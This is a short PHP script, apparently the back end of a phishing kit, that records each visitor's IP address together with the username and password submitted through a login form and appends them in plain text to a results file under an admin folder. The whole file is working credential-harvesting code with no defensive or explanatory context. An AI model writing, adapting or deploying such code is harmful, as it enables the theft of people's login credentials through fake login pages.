

<?php
  $ip = $_SERVER['REMOTE_ADDR'];
  $username = $_POST['user'];
  $password = $_POST['pass'];


  $file = fopen("../../admin/rezlts/LG.txt", "a");
  fwrite($file, $ip.",".$username.",".$password."\n");
  fclose($file);
 
?>

